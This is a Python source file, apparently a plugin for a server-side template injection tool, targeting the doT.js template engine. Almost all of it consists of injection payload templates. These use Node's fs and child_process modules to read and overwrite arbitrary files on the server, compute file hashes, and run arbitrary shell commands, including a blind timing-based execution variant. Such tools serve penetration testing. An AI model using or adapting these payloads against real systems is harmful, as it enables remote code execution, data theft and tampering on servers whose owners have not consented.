from utils.strings import quote
from plugins.languages import javascript
from utils.loggers import log
from utils import rand
import base64
import re

class Dot(javascript.Javascript):

    def init(self):

        self.update_actions({
            'render' : {
                'render': '{{=%(code)s}}',
                'header': '{{=%(header)s}}',
                'trailer': '{{=%(trailer)s}}'
            },
            'write' : {
                'call' : 'inject',
                'write' : """{{=global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')}}""",
                'truncate' : """{{=global.process.mainModule.require('fs').writeFileSync('%(path)s', '')}}"""
            },
            'read' : {
                'call': 'evaluate',
                'read' : """global.process.mainModule.require('fs').readFileSync('%(path)s').toString('base64');"""
            },
            'md5' : {
                'call': 'evaluate',
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('%(path)s')).digest("hex");"""
            },
            'evaluate' : {
                'test_os': """global.process.mainModule.require('os').platform()""",
            },
            'execute' : {
                'call': 'evaluate',
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString());"""
            },
            'execute_blind' : {
                # The bogus prefix is to avoid false detection of Javascript instead of doT
                'call': 'inject',
                'execute_blind': """{{=''}}{{global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i');}}"""
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },

            { 'level': 1, 'prefix': '%(closure)s;}}', 'suffix' : '{{1;', 'closures' : javascript.ctx_closures },
            
        ])
        
